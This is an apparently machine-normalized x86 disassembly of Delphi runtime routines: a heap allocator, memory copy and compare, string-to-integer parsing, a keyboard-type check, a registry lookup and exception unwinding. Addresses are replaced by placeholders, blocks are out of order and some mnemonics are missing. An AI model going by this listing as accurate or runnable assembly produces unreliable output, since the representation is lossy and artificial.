push sub_44b610
push [ fs : ecx ]
mov [ fs : ecx ] esp
cmp [ rw-data ] 0x0
je r-xdata
call sub_44adc8
test al al
jne r-xdata
add ebx 0x7
and ebx 0xfffffffc
cmp ebx 0xc
jge r-xdata
push rw-data
call EnterCriticalSection
xor eax eax
mov [ ebp - 0x4 ] eax
jmp r-xdata
cmp ebx 0x1000
jg r-xdata
mov ebx 0xc
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
cmp ebx [ rw-data ]
jg r-xdata
mov eax ebx
test eax eax
jns r-xdata
mov eax ebx
call sub_44b3a8
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
sub [ rw-data ] ebx
cmp [ rw-data ] 0xc
jge r-xdata
sar eax 0x2
mov edx [ rw-data ]
mov edx [ edx + eax * 4 - 0xc ]
test edx edx
je r-xdata
add eax 0x3
retn
push rw-data
call LeaveCriticalSection
mov eax [ rw-data ]
add [ rw-data ] ebx
mov edx ebx
or edx 0x2
mov [ eax ] edx
add eax 0x4
mov [ ebp - 0x4 ] eax
inc [ rw-data ]
sub ebx 0x4
add [ rw-data ] ebx
call sub_44c848
jmp r-xdata
add ebx [ rw-data ]
xor eax eax
mov [ rw-data ] eax
mov esi edx
mov eax esi
add eax ebx
and [ eax ] 0xfffffffe
mov eax [ edx + 0x4 ]
cmp edx eax
jne r-xdata
mov ecx ebx
test ecx ecx
jns r-xdata
mov eax ebx
test eax eax
jns r-xdata
sar ecx 0x2
mov edi [ rw-data ]
mov [ edi + ecx * 4 - 0xc ] eax
mov ecx [ edx ]
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0x4 ] eax
mov ecx [ ebp - 0x8 ]
mov [ eax ] ecx
add ecx 0x3
sar eax 0x2
mov ecx [ rw-data ]
xor edi edi
mov [ ecx + eax * 4 - 0xc ] edi
jmp r-xdata
add eax 0x3
mov eax esi
mov edx [ edx + 0x8 ]
or edx 0x2
mov [ eax ] edx
add eax 0x4
mov [ ebp - 0x4 ] eax
inc [ rw-data ]
sub ebx 0x4
add [ rw-data ] ebx
call sub_44c848
jmp r-xdata
sub_44b624
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx eax
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
xor ecx ecx
push ebp
push sub_44b7b6
push [ fs : ecx ]
mov [ fs : ecx ] esp
cmp [ rw-data ] 0x0
je r-xdata
call sub_44adc8
test al al
jne r-xdata
mov esi ebx
sub esi 0x4
mov ebx [ esi ]
test bl 0x2
jne r-xdata
push rw-data
call EnterCriticalSection
mov [ rw-data ] 0x8
mov [ ebp - 0x4 ] 0x8
jmp r-xdata
dec [ rw-data ]
mov eax ebx
and eax 0x7ffffffc
sub eax 0x4
sub [ rw-data ] eax
test bl 0x1
je r-xdata
mov [ rw-data ] 0x9
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
and ebx 0x7ffffffc
mov eax esi
add eax ebx
mov edi eax
cmp edi [ rw-data ]
jne r-xdata
mov eax esi
sub eax 0xc
mov edx [ eax + 0x8 ]
cmp edx 0xc
jl r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ eax ]
test dl 0x2
je r-xdata
sub [ rw-data ] ebx
add [ rw-data ] ebx
cmp [ rw-data ] 0x3c00
jle r-xdata
mov [ rw-data ] 0xa
jmp r-xdata
test edx 0x80000003
je r-xdata
retn
push rw-data
call LeaveCriticalSection
mov eax edi
cmp [ eax + 0x4 ] 0x0
je r-xdata
and edx 0x7ffffffc
cmp edx 0x4
jge r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
call sub_44c848
jmp r-xdata
call sub_44b244
mov eax esi
sub eax edx
cmp edx [ eax + 0x8 ]
je r-xdata
mov [ rw-data ] 0xb
jmp r-xdata
cmp [ eax ] 0x0
je r-xdata
or [ eax ] 0x1
jmp r-xdata
mov [ rw-data ] 0xb
jmp r-xdata
add ebx edx
mov esi eax
call sub_44af6c
mov [ rw-data ] 0xa
jmp r-xdata
cmp [ eax + 0x8 ] 0xc
jge r-xdata
mov edx ebx
mov eax esi
call sub_44b1bc
mov edx [ eax + 0x8 ]
add ebx edx
call sub_44af6c
sub_44b7c8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
add esi 0x7
and esi 0xfffffffc
cmp esi 0xc
jge r-xdata
mov ebp eax
sub ebp 0x4
mov edi [ ebp ]
and edi 0x7ffffffc
mov eax ebp
add eax edi
mov ebx eax
cmp edi esi
jl r-xdata
mov esi 0xc
mov eax esi
sub eax edi
mov [ esp + 0x4 ] eax
cmp ebx [ rw-data ]
jne r-xdata
mov edx edi
sub edx esi
mov [ esp ] edx
cmp ebx [ rw-data ]
jne r-xdata
test [ ebx ] 0x2
jne r-xdata
mov eax [ rw-data ]
cmp eax [ esp + 0x4 ]
jl r-xdata
mov ebx eax
test [ ebx ] 0x2
jne r-xdata
mov eax [ esp ]
sub [ rw-data ] eax
mov eax [ esp ]
add [ rw-data ] eax
cmp [ rw-data ] 0xc
jge r-xdata
mov eax [ ebx ]
test eax 0x80000000
je r-xdata
mov edx ebx
mov eax edx
mov ecx [ eax + 0x8 ]
mov [ esp ] ecx
mov ecx [ esp ]
cmp ecx [ esp + 0x4 ]
jge r-xdata
call sub_44b244
mov ebx ebp
add ebx edi
mov eax [ esp + 0x4 ]
sub [ rw-data ] eax
mov eax [ esp + 0x4 ]
add [ rw-data ] eax
cmp [ rw-data ] 0xc
jge r-xdata
cmp [ esp ] 0xc
jl r-xdata
mov eax ebx
mov edx [ eax + 0x8 ]
add [ esp ] edx
call sub_44af6c
mov eax esi
sub eax edi
add [ rw-data ] eax
mov eax [ ebp ]
and eax 0x80000003
or esi eax
mov [ ebp ] esi
mov al 0x1
mov eax [ esp ]
add [ rw-data ] eax
mov eax [ esp ]
sub [ rw-data ] eax
mov esi edi
jmp r-xdata
xor eax eax
jmp r-xdata
and eax 0x7ffffffc
add eax ebx
mov ebx eax
mov edx [ esp + 0x4 ]
mov eax ebx
call sub_44b348
test al al
je r-xdata
call sub_44af6c
mov eax [ esp + 0x4 ]
sub [ esp ] eax
cmp [ esp ] 0xc
jl r-xdata
add edx [ esp ]
mov ebx edx
mov eax [ esp ]
sub [ esp + 0x4 ] eax
jmp r-xdata
mov eax esi
sub eax edi
add [ rw-data ] eax
mov eax [ ebp ]
and eax 0x80000003
or esi eax
mov [ ebp ] esi
mov al 0x1
jmp r-xdata
mov eax [ rw-data ]
add [ rw-data ] eax
add esi [ rw-data ]
xor eax eax
mov [ rw-data ] eax
mov esi edi
jmp r-xdata
mov ebx ebp
add ebx esi
mov eax [ esp ]
or eax 0x2
mov [ ebx ] eax
mov eax ebx
add eax 0x4
call sub_44b030
jmp r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebx ebp
add ebx edi
jmp r-xdata
add esi [ esp ]
mov ebx ebp
add ebx esi
and [ ebx ] 0xfffffffe
jmp r-xdata
mov eax ebp
add eax esi
mov edx [ esp ]
call sub_44b1bc
jmp r-xdata
sub_44b998
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_44ba49
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ rw-data ] 0x0
je r-xdata
call sub_44adc8
test al al
jne r-xdata
mov edx esi
mov eax ebx
call sub_44b7c8
test al al
je r-xdata
push rw-data
call EnterCriticalSection
xor eax eax
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax esi
call sub_44b49c
mov edi eax
mov eax ebx
sub eax 0x4
mov eax [ eax ]
and eax 0x7ffffffc
sub eax 0x4
cmp esi eax
jge r-xdata
mov [ ebp - 0x4 ] ebx
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
test edi edi
je r-xdata
mov eax esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov [ ebp - 0x4 ] edi
mov edx edi
mov ecx ebx
xchg ecx eax
call sub_44bbe8
mov eax ebx
call sub_44b624
retn
push rw-data
call LeaveCriticalSection
sub_44ba8c
mov ecx [ eax ]
test ecx ecx
je r-xdata
test edx edx
je r-xdata
test edx edx
je r-xdata
retn
push eax
mov eax edx
call [ rw-data ]
pop ecx
or eax eax
je r-xdata
mov [ eax ] edx
mov eax ecx
call [ rw-data ]
or eax eax
jne r-xdata
push eax
mov eax ecx
call [ rw-data ]
pop ecx
or eax eax
je r-xdata
mov al 0x1
jmp sub_44bb50
mov [ ecx ] eax
mov al 0x2
jmp sub_44bb50
retn
mov [ ecx ] eax
retn
sub_44bb14
mov eax sub_44b49c
cmp eax [ rw-data ]
jne r-xdata
mov al 0x1
retn
mov eax sub_44b624
cmp eax [ rw-data ]
jne r-xdata
mov eax sub_44b998
cmp eax [ rw-data ]
jne r-xdata
xor eax eax
retn
sub_44bb50
and eax 0x7f
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
dec eax
mov al [ eax + sub_44bb79 ]
jns r-xdata
pop edx
call ecx
jmp r-xdata
call sub_401140
mov eax [ eax + 0xc ]
pop [ rw-data ]
jmp sub_44cac8
sub_44bbe8
push esi
push edi
mov esi eax
mov edi edx
mov eax ecx
cmp edi esi
ja r-xdata
lea esi [ esi + ecx - 0x4 ]
lea edi [ edi + ecx - 0x4 ]
sar ecx 0x2
js r-xdata
je r-xdata
pop edi
pop esi
retn
std
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
add esi 0x3
add edi 0x3
[ edi ] [ esi ]
cld
sar ecx 0x2
js r-xdata
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
retn
sub_44bc6c
push esi
push edi
mov edi eax
xor eax eax
mov esi edx
mov al [ edx ]
cmp al cl
ja r-xdata
mov [ edi ] cl
inc esi
inc edi
and ecx 0xff
[ edi ] [ esi ]
pop edi
pop esi
retn
inc eax
mov ecx eax
and eax 0x3
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
[ edi ] [ esi ]
pop edi
pop esi
retn
sub_44bc9c
push ebx
push esi
push edi
mov esi eax
mov edi edx
xor eax eax
xor edx edx
mov al [ esi ]
mov dl [ edi ]
inc esi
inc edi
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x3
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov cl [ esi ]
cmp cl [ edi ]
jne r-xdata
pop edx
cmp cl bl
jne r-xdata
dec edx
je r-xdata
pop edi
pop esi
pop ebx
retn
dec edx
je r-xdata
cmp ch bh
jne r-xdata
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
mov cl [ esi + 0x1 ]
cmp cl [ edi + 0x1 ]
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
dec edx
je r-xdata
cmp ch bh
jmp r-xdata
mov cl [ esi + 0x2 ]
cmp cl [ edi + 0x2 ]
jne r-xdata
sub_44bd20
push ebx
push esi
push ecx
mov esi ecx
shr esi 0x2
je r-xdata
pop esi
and esi 0x3
je r-xdata
mov ecx [ eax ]
mov ebx [ edx ]
cmp ecx ebx
jne r-xdata
pop esi
pop ebx
retn
mov cl [ eax ]
cmp cl [ edx ]
jne r-xdata
pop esi
cmp cl bl
jne r-xdata
dec esi
je r-xdata
dec esi
je r-xdata
cmp ch bh
jne r-xdata
add eax 0x4
add edx 0x4
mov ecx [ eax + 0x4 ]
mov ebx [ edx + 0x4 ]
cmp ecx ebx
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
mov cl [ eax + 0x1 ]
cmp cl [ edx + 0x1 ]
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add eax 0x8
add edx 0x8
dec esi
jne r-xdata
dec esi
je r-xdata
cmp ch bh
jmp r-xdata
mov cl [ eax + 0x2 ]
cmp cl [ edx + 0x2 ]
jne r-xdata
sub_44bd90
push edi
mov edi eax
mov ch cl
mov eax ecx
shl eax 0x10
mov ax cx
mov ecx edx
sar ecx 0x2
js r-xdata
pop edi
retn
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
sub_44bdb0
push ebx
push esi
push edi
mov esi eax
push eax
test eax eax
je r-xdata
inc esi
jmp r-xdata
xor eax eax
xor ebx ebx
mov edi 0xccccccc
pop ebx
sub esi ebx
jmp r-xdata
mov bl [ esi ]
inc esi
cmp bl 0x20
je r-xdata
mov ch 0x0
cmp bl 0x2d
je r-xdata
mov [ edx ] esi
pop edi
pop esi
pop ebx
retn
inc ch
cmp bl 0x2b
je r-xdata
test bl bl
je r-xdata
mov bl [ esi ]
inc esi
jmp r-xdata
cmp bl 0x24
je r-xdata
sub bl 0x30
cmp bl 0x9
ja r-xdata
mov edi 0xfffffff
mov bl [ esi ]
inc esi
test bl bl
je r-xdata
cmp bl 0x78
je r-xdata
cmp eax edi
ja r-xdata
cmp bl 0x61
jb r-xdata
cmp bl 0x58
je r-xdata
lea eax [ eax + eax * 4 ]
add eax eax
add eax ebx
mov bl [ esi ]
inc esi
test bl bl
jne r-xdata
sub bl 0x30
cmp bl 0x9
jbe r-xdata
sub bl 0x20
cmp bl 0x30
jne r-xdata
dec ch
je r-xdata
cmp eax edi
ja r-xdata
sub bl 0x11
cmp bl 0x5
ja r-xdata
mov bl [ esi ]
inc esi
cmp bl 0x78
je r-xdata
neg eax
jle r-xdata
test eax eax
jl r-xdata
shl eax 0x4
add eax ebx
mov bl [ esi ]
inc esi
test bl bl
jne r-xdata
add bl 0xa
cmp bl 0x58
je r-xdata
pop ecx
xor esi esi
js r-xdata
jmp r-xdata
test bl bl
je r-xdata
jmp r-xdata
sub_44be7c
push eax
mov cl 0xff
pop edx
sub eax edx
mov [ edx ] al
retn
inc eax
mov [ eax ] ch
dec cl
jne r-xdata
mov ch [ edx ]
inc edx
test ch ch
je r-xdata
sub_44be94
push ebx
push eax
cmp ecx 0xff
jbe r-xdata
mov bl [ edx ]
inc edx
test bl bl
je r-xdata
mov ecx 0xff
pop edx
sub eax edx
mov [ edx ] al
pop ebx
retn
inc eax
mov [ eax ] bl
dec ecx
jne r-xdata
sub_44beb8
push ebx
xor ebx ebx
push 0x0
call GetKeyboardType
cmp eax 0x7
jne r-xdata
mov eax ebx
pop ebx
retn
push 0x1
call GetKeyboardType
and eax 0xff00
cmp eax 0xd00
je r-xdata
mov bl 0x1
cmp eax 0x400
jne r-xdata
sub_44bee8
push ebp
mov ebp esp
add esp 0xfffffff4
movzx eax [ rw-data ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x4 ]
push eax
push 0x1
push 0x0
push r-xdata
push 0x80000002
call RegOpenKeyExA
test eax eax
jne r-xdata
mov ax [ rw-data ]
and ax 0xffc0
mov dx [ ebp - 0x8 ]
and dx 0x3f
or ax dx
mov [ rw-data ] ax
mov esp ebp
pop ebp
retn
xor eax eax
push ebp
push sub_44bf59
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0xc ] 0x4
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call RegQueryValueExA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call RegCloseKey
retn
sub_44bfd0
push ebx
xor ebx ebx
or edx edx
je r-xdata
mov al bl
pop ebx
retn
mov eax [ eax - 0x2c ]
xor ecx ecx
mov cl [ eax ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
dec edx
dec ecx
jne r-xdata
mov bh [ eax + ecx ]
xor bh [ edx + ecx ]
and bh 0xdf
jne r-xdata
inc ebx
sub_44c018
push ebx
push esi
mov ebx eax
mov esi eax
test esi esi
jne r-xdata
call sub_44d314
mov eax ebx
mov esi [ esi ]
mov edx [ esi - 0x40 ]
mov esi [ esi - 0x24 ]
test edx edx
je r-xdata
call sub_44ba74
pop esi
pop ebx
retn
sub_44c07c
push ebx
push esi
push edi
mov ebx eax
mov edi edx
stosd [ edi ]
mov ecx [ ebx - 0x28 ]
xor eax eax
push ecx
shr ecx 0x2
dec ecx
[ edi ]
pop ecx
and ecx 0x3
[ edi ]
mov eax edx
mov edx esp
mov ebx [ ebx - 0x24 ]
test ebx ebx
je r-xdata
push ecx
cmp esp edx
je r-xdata
mov ebx [ ebx ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
pop ebx
mov ecx [ ebx ]
add ebx 0x4
mov ecx [ ebx - 0x48 ]
test ecx ecx
je r-xdata
add ebx 0x1c
dec ecx
jne r-xdata
mov edi [ ebx + 0x14 ]
mov [ eax + edi ] esi
mov esi [ ebx + 0x10 ]
test esi esi
je r-xdata
cmp esp edx
jne r-xdata
sub_44c0d4
xchg edx ecx
cmp ecx 0xff000000
jae r-xdata
and ecx 0xffffff
add ecx eax
mov eax edx
mov edx [ ecx ]
jmp sub_44e3e8
cmp ecx 0xfe000000
jb r-xdata
jmp ecx
movsx ecx cx
add ecx [ eax ]
jmp [ ecx ]
sub_44c104
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov edi ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_44c192
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax [ esi ]
call sub_44c1a4
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
mov [ edi ] eax
xor ebx ebx
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
lea ecx [ ebp - 0x8 ]
mov edx [ ebx + 0x18 ]
mov eax esi
call sub_44c0d4
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_44e3e8
add esi eax
mov [ edi ] esi
jmp r-xdata
xor ebx ebx
jmp r-xdata
cmp [ ebx + 0x14 ] 0x0
je r-xdata
cmp [ edi ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44c199
lea eax [ ebp - 0x8 ]
call sub_44e3d0
retn
mov bl 0x1
jmp r-xdata
mov eax [ edi ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
sub_44c1a4
push ebx
push esi
mov ebx eax
mov ebx [ ebx - 0x24 ]
test ebx ebx
je r-xdata
mov ecx [ eax ]
add eax 0x4
xor eax eax
mov ebx [ ebx ]
jmp r-xdata
add eax 0x1c
dec ecx
jne r-xdata
mov esi [ edx + 0x4 ]
cmp esi [ eax + 0x4 ]
jne r-xdata
mov eax [ ebx - 0x48 ]
test eax eax
je r-xdata
mov esi [ edx ]
cmp esi [ eax ]
jne r-xdata
mov esi [ edx + 0x8 ]
cmp esi [ eax + 0x8 ]
jne r-xdata
mov esi [ edx + 0xc ]
cmp esi [ eax + 0xc ]
je r-xdata
pop esi
pop ebx
retn
sub_44c21c
push edi
xchg ebx eax
jmp r-xdata
mov edi [ ebx - 0x30 ]
test edi edi
je r-xdata
mov ebx [ ebx - 0x24 ]
test ebx ebx
jne r-xdata
movzx ecx [ edi ]
push ecx
add edi 0x2
[ edi ]
je r-xdata
mov ebx [ ebx ]
pop edi
retn
pop eax
add eax eax
sub eax ecx
mov ebx [ edi + eax * 2 - 0x4 ]
pop edi
retn
pop ecx
sub_44c24c
push eax
push ecx
mov eax [ eax ]
call sub_44c21c
pop ecx
pop eax
je r-xdata
pop ecx
jmp r-xdata
jmp ebx
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0xd2
jmp r-xdata
call [ rw-data ]
pop [ rw-data ]
jmp sub_44cac8
sub_44c264
push ebx
mov ebx edx
mov eax [ eax ]
call sub_44c21c
mov eax ebx
pop ebx
jne r-xdata
retn
pop ecx
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0xd2
jmp r-xdata
call [ rw-data ]
pop [ rw-data ]
jmp sub_44cac8
sub_44c2a8
push ebx
mov bx [ edx ]
or bx bx
je r-xdata
pop ebx
mov ecx [ eax ]
jmp [ ecx - 0x10 ]
cmp bx 0xc000
jae r-xdata
push eax
mov eax [ eax ]
call sub_44c21c
pop eax
je r-xdata
mov ecx ebx
pop ebx
jmp ecx
sub_44c2d0
push ebx
push esi
push edi
xor ecx ecx
xor edi edi
mov bl [ edx ]
jmp r-xdata
mov esi [ eax - 0x34 ]
test esi esi
je r-xdata
mov eax [ eax - 0x24 ]
test eax eax
jne r-xdata
mov di [ esi ]
add esi 0x2
mov eax [ eax ]
jmp r-xdata
mov ch 0x0
mov cx [ esi ]
add esi ecx
dec edi
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov bl [ edx ]
jmp r-xdata
dec ecx
jne r-xdata
mov cl [ esi + 0x6 ]
cmp cl bl
je r-xdata
mov bl [ esi + ecx + 0x6 ]
xor bl [ edx + ecx ]
and bl 0xdf
jne r-xdata
mov eax [ esi + 0x2 ]
sub_44c320
push ebx
push esi
push edi
xor ecx ecx
xor edi edi
mov bl [ edx ]
push eax
mov eax [ eax - 0x24 ]
test eax eax
jne r-xdata
mov di [ esi ]
add esi 0x6
mov eax [ eax ]
mov esi [ eax - 0x38 ]
test esi esi
je r-xdata
pop edx
jmp r-xdata
mov bl [ esi + ecx + 0x6 ]
xor bl [ edx + ecx ]
and bl 0xdf
jne r-xdata
lea esi [ esi + ecx + 0x7 ]
dec edi
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov bl [ edx ]
mov cl [ esi + 0x6 ]
jmp r-xdata
dec ecx
jne r-xdata
mov cl [ esi + 0x6 ]
cmp cl bl
je r-xdata
mov eax [ esi ]
pop edx
add eax edx
sub_44c370
push edx
push ecx
push ebx
test dl dl
jl r-xdata
xor edx edx
lea ecx [ esp + 0x10 ]
mov ebx [ fs : edx ]
mov [ ecx ] ebx
mov [ ecx + 0x8 ] ebp
mov [ ecx + 0x4 ] j_sub_44c4bc#4
mov [ ecx + 0xc ] eax
mov [ fs : edx ] ecx
pop ebx
pop ecx
pop edx
retn
call [ eax - 0xc ]
sub_44c3fc
cmp [ rw-data ] 0x0
je r-xdata
retn
push eax
push eax
push edx
push esp
push 0x2
push 0x0
push 0xeedfae4
call RaiseException
add esp 0x8
pop eax
sub_44c430
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push [ ebx + 0x4 ]
jmp r-xdata
push esp
push 0x1
push 0x0
push 0xeedfae0
call RaiseException
add esp 0x4
pop eax
retn
sub_44c444
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push ebx
jmp r-xdata
push esp
push 0x1
push 0x0
push 0xeedfae0
call RaiseException
add esp 0x4
pop eax
retn
sub_44c458
test ecx ecx
je r-xdata
retn
mov eax [ ecx + 0x1 ]
cmp [ ecx ] 0xe9
je r-xdata
add ecx 0x5
cmp [ ecx ] 0xeb
jne r-xdata
movsx eax al
inc ecx
inc ecx
jmp r-xdata
add ecx eax
sub_44c478
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push edx
push ecx
call sub_44c458
push ecx
push esp
push 0x1
push 0x0
push 0xeedfae1
call RaiseException
pop ecx
pop ecx
pop edx
pop eax
sub_44c4bc
mov eax [ esp + 0x4 ]
test [ eax + 0x4 ] 0x6
jne r-xdata
mov eax 0x1
retn
cmp [ eax ] 0xeedfade
mov edx [ eax + 0x18 ]
mov ecx [ eax + 0x14 ]
je r-xdata
cmp [ rw-data ] 0x1
jbe r-xdata
cld
call sub_44bfac
mov edx [ rw-data ]
test edx edx
je r-xdata
or [ eax + 0x4 ] 0x2
push ebx
xor ebx ebx
push esi
push edi
push ebp
mov ebx [ fs : ebx ]
push ebx
push eax
push edx
push ecx
mov edx [ esp + 0x28 ]
push 0x0
push eax
push r-xdata
push edx
call RtlUnwind
mov edi [ esp + 0x28 ]
call sub_401140
push [ eax + 0x8 ]
mov [ eax + 0x8 ] esp
mov ebp [ edi + 0x8 ]
mov ebx [ edi + 0x4 ]
mov [ edi + 0x4 ] r-xdata
add ebx 0x5
call sub_44c444
jmp ebx
cmp [ rw-data ] 0x0
ja r-xdata
call edx
test eax eax
je r-xdata
push eax
lea eax [ esp + 0x8 ]
push edx
push ecx
push eax
call UnhandledExceptionFilter
cmp eax 0x0
pop ecx
pop edx
pop eax
je r-xdata
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
cmp [ ecx ] 0xeefface
je r-xdata
mov edx eax
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0xc ]
call sub_44c3fc
cmp [ rw-data ] 0x0
jbe r-xdata
cmp [ rw-data ] 0x0
ja r-xdata
lea ecx [ esp + 0x4 ]
push eax
push ecx
call UnhandledExceptionFilter
cmp eax 0x0
pop eax
je r-xdata
mov edx eax
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0xc ]
jmp r-xdata
sub_44c5e8
mov eax [ esp + 0x4 ]
test [ eax + 0x4 ] 0x6
jne r-xdata
mov eax 0x1
retn
cmp [ eax ] 0xeedfade
je r-xdata
mov eax [ eax + 0x18 ]
mov eax [ eax ]
cld
call sub_44bfac
mov edx [ rw-data ]
test edx edx
je r-xdata
mov eax [ esp + 0x14 ]
cmp [ eax ] 0xeedfade
mov edx [ eax + 0x18 ]
mov ecx [ eax + 0x14 ]
je r-xdata
mov edi ebp
jmp r-xdata
call edx
test eax eax
jne r-xdata
cmp [ rw-data ] 0x1
jbe r-xdata
call [ rw-data ]
mov edx [ esp + 0x1c ]
call sub_44c3fc
cmp [ rw-data ] 0x0
jbe r-xdata
mov eax [ eax ]
cmp eax edi
je r-xdata
mov edx [ esp + 0x8 ]
push ebx
push esi
push edi
push ebp
mov ecx [ edx + 0x4 ]
mov ebx [ ecx + 0x5 ]
lea esi [ ecx + 0x9 ]
mov ebp eax
jmp r-xdata
xor ebx ebx
mov ebx [ fs : ebx ]
push ebx
push eax
push edx
push ecx
mov edx [ esp + 0x28 ]
or [ eax + 0x4 ] 0x2
push esi
push 0x0
push eax
push r-xdata
push edx
call RtlUnwind
pop ebx
mov edi [ esp + 0x28 ]
call sub_401140
push [ eax + 0x8 ]
mov [ eax + 0x8 ] esp
mov ebp [ edi + 0x8 ]
mov [ edi + 0x4 ] r-xdata
mov eax [ esp + 0x8 ]
call sub_44c430
jmp [ ebx + 0x4 ]
cmp [ rw-data ] 0x0
ja r-xdata
mov edx eax
mov eax [ esp + 0x14 ]
mov ecx [ eax + 0xc ]
jmp r-xdata
cmp [ rw-data ] 0x0
ja r-xdata
mov ecx [ eax - 0x28 ]
cmp ecx [ edi - 0x28 ]
jne r-xdata
push eax
lea eax [ esp + 0x8 ]
push edx
push ecx
push eax
call UnhandledExceptionFilter
cmp eax 0x0
pop ecx
pop edx
pop eax
je r-xdata
lea ecx [ esp + 0x4 ]
push eax
push ecx
call UnhandledExceptionFilter
cmp eax 0x0
pop eax
je r-xdata
mov edi [ edi - 0x24 ]
mov eax [ esi ]
test edi edi
jne r-xdata
mov eax [ eax - 0x2c ]
mov edx [ edi - 0x2c ]
xor ecx ecx
mov cl [ eax ]
cmp cl [ edx ]
jne r-xdata
mov edi [ edi ]
add esi 0x8
dec ebx
jne r-xdata
inc eax
inc edx
call sub_44bd20
je r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
jmp r-xdata
sub_44c770
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
test [ eax + 0x4 ] 0x6
je r-xdata
mov eax 0x1
retn
mov ecx [ edx + 0x4 ]
mov [ edx + 0x4 ] r-xdata
push ebx
push esi
push edi
push ebp
mov ebp [ edx + 0x8 ]
add ecx 0x5
call sub_44c478
call ecx
pop ebp
pop edi
pop esi
pop ebx
sub_44c7a8
pop edx
push esp
push ebp
push edi
push esi
push ebx
push eax
push edx
push esp
push 0x7
push 0x1
push 0xeedfade
push edx
jmp RaiseException
sub_44c7c4
mov eax [ esp + 0x30 ]
mov [ eax + 0x4 ] r-xdata
call sub_401140
mov edx [ eax + 0x8 ]
mov ecx [ edx ]
mov [ eax + 0x8 ] ecx
mov eax [ edx + 0xc ]
and [ eax + 0x4 ] 0xfffffffd
cmp [ eax ] 0xeedfade
je r-xdata
xor eax eax
add esp 0x14
mov edx [ fs : eax ]
pop ecx
mov edx [ edx ]
mov [ ecx ] edx
pop ebp
pop edi
pop esi
pop ebx
mov eax 0x1
retn
mov eax [ edx + 0x8 ]
call sub_44c070
call sub_44c3e0
sub_44c818
call sub_401140
mov edx [ eax + 0x8 ]
mov ecx [ edx ]
mov [ eax + 0x8 ] ecx
mov eax [ edx + 0x8 ]
call sub_44c070
pop edx
mov esp [ esp + 0x2c ]
xor eax eax
pop ecx
mov [ fs : eax ] ecx
pop eax
pop ebp
call sub_44c4a0
jmp edx
sub_44c860
xor edx edx
mov eax [ rw-data ]
mov ecx [ fs : edx ]
cmp eax ecx
jne r-xdata
cmp ecx 0xffffffff
je r-xdata
mov eax [ eax ]
